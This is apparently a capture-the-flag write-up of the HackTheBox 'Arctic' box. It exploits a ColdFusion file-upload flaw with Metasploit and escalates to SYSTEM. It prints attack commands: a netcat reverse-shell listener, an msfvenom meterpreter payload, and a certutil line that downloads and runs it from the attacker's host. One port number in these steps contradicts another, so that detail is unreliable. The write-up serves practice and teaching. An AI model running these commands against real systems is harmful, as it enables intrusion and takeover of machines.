+++
title = "HackTheBox Writeup: Arctic"
date = "2019-08-22T01:01:33+02:00"
tags = [
  "hackthebox",
  "writeup",
  "ctf",
]
categories = [
  "hackthebox"
]
highlight = "true"
toc = "true"
+++

![1](/images/arctic-writeup/1.png)

Arctic is an easy rated Windows hacking challenge from HackTheBox, here is a writeup/walkthrough to go from boot to root. This box is all about publicly available exploits and known unpatched vulnerabilities.

---

## Enumeration

Let's start with a full port scan using nmap, the network mapper, using the options to enumerate service versions (-sV) and execute safe scripts (-sC):

![2](/images/arctic-writeup/2.png)

We only found two Windows Remote Procedure Call ports and a more unusual one, port 8500 with an unknown service running behind it. Let's connect to it from a web browser to see if we can see anything:

![3](/images/arctic-writeup/3.png)

As it turns out ti's just a web server, one that takes a long time to respond to each request so that with the unusual port number is probably what confused nmap. We are presented two different folders, opening CFIDE reveals something interesting, what seems to be a web application with an administration panel:

![4](/images/arctic-writeup/4.png)

Opening the administrator folder leads us to the login page of an Adove ColdFusion installation:

![5](/images/arctic-writeup/5.png)

One of the first things to do when a web app is found is to look for known vulnerabilities on exploit databases, in my case I'm going to search straight from Metasploit's modules, and in fact we find an interesting arbitrary file upload + code execution exploit for ColdFusion 8.0.1, the version that seems to be running on Arctic judging from the login page:

![6](/images/arctic-writeup/6.png)

---

## Exploitation: getting user.txt

All we need to do to launch this exploit is changing the port number and IP address of our target, however it doesn't seem to work as the exploit fails immediately, probably because of the long response times of the web server:

![7](/images/arctic-writeup/7.png)

In order to fix this we can set up Burp as a proxy to intercept the request responsible for the exploit and see what it does:

![7](/images/arctic-writeup/8.png)

By setting up Burp like this we are telling it to listen to localhost on port 9999 for connections, intercept the requests it receives, and redirect them to Arctic. This way we can tell the exploit to send the exploit to 127.0.0.1:9999 and Burp will intercept it to let us see how it works, in facts after changing the exploit target and re-launching it we receive an incoming connection containing the exploit itself:

![7](/images/arctic-writeup/9.png)

The exploit continues but what is important to note are the parts I enclosed in red rectangles: the first is what is supposed to be the file uploaded on the server. Let's scroll down the end of the exploit though to see where it actually creates a connection, because the payload used in this exploit, according to the settings on Metasploit, is a generic reverse shell:

![7](/images/arctic-writeup/10.png)

From this we can see that Metasploit already set the correct interface as the IP address to connect the box to, and it will connect to us on port 4444 so let's start a netcat listener on our attacking box to receive the connection:

    $ nc -lvp 4444

Then we can forward the request on Burp, and load the URL of the uploaded file, which will be located in /userfiles/file/VTBMWLQ.jsp:

![7](/images/arctic-writeup/11.png)

We can know where the file was uploaded because the /userfiles directory has been created by the web application when we uploaded the file and we can see it by connecting back to the root of the web server:

![7](/images/arctic-writeup/12.png)

Anyway we are the user "tolis" on the box, this means we can grab user.txt:

![7](/images/arctic-writeup/13.png)

---

## Dropping meterpreter

Now we have to think about becoming administrators on the box. First things first I run the "systeminfo" command to see what version of WIndows we are running and whether it's a 32 or 64 bits OS:

![7](/images/arctic-writeup/14.png)

So we are dealing with Windows Server 2008 R2 Standard, 64-bits. With this info we can pass from a normal cmd shell to a meterpreter shell to have access to all its useful modules. I'll be doing it by dropping an executable on the system (I tried the TrustedSec Unicorn method but for some reason it wouldn't work on this box even though it's supposed to? I dunno) crafted from msfvenom:

    $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=9090 -f exe > arctic.exe

Then in order to drop it on the box we must start a local webserver on our local machine, I like to do it with PHP:

    $ php -S 0.0.0.0:8181 -t .


Now we can download the file from our machine using certutil.exe with a command like this:

    $ certutil.exe -urlcache -split -f "http://10.10.14.29:9090/arctic.exe" arctic.exe

This will save the executable in our current directory so we can run it and enjoy our meterpreter shell after starting a listener on Metasploit:

    $ arctic.exe

![7](/images/arctic-writeup/15.png)

![7](/images/arctic-writeup/16.png)

For some reason Metasploit failed to load its library containing all the commands so it would give me errors no matter what I tried to do, so I had to load stdapi manually:

    meterpreter> load stdapi

Then it started to work normally. By running "sysinfo" we can view some information about the system and our meterpreter session, one of these tells us we are actually running a x86 version of meterpreter on a 64 bits OS so this might give us inaccurate results when we run post exploitation modules:

![7](/images/arctic-writeup/17.png)

This can be fixed by listing the currently running processes on the box with the "ps" command, choosing a x64 process ID (PID) and using the "migrate" command to migrate our session on to that process, turning it into a 64 bits meterpreter session. In my case I chose PID number 3380, belonging to conhost.exe:

![7](/images/arctic-writeup/18.png)

And the process migration is successful as we can see from the output of sysinfo:

![7](/images/arctic-writeup/19.png)

---

## Privilege escalation to SYSTEM

Now we can finally use a very useful post exploitation module that looks for missing hot fixes making the system vulnerable to local privilege escalation exploits, the module is called post/multi/recon/local_exploit_suggester and we can use it by pressing Ctrl+Z to put our meterpreter session in the background, typing the following command on the msf console:

    msf> use post/multi/recon/local_exploit_suggester

And then specify on what session to run the module:

    msf> set session 1

And launch it:

![7](/images/arctic-writeup/20.png)

We find out that the box appears to be vulnerable to the schelevator exploit, a fairly common and reliable one, so we are going to use that one. Once again all we need is a "use" command to specify the exploit and a "set" to tell Metasploit on what session to run it, the exploit will create a new listener and session for us once it's done running, and we will have complete control over the box because we'll be SYSTEM:

![7](/images/arctic-writeup/21.png)

So we can grab the root flag and complete our mission:

![7](/images/arctic-writeup/22.png)

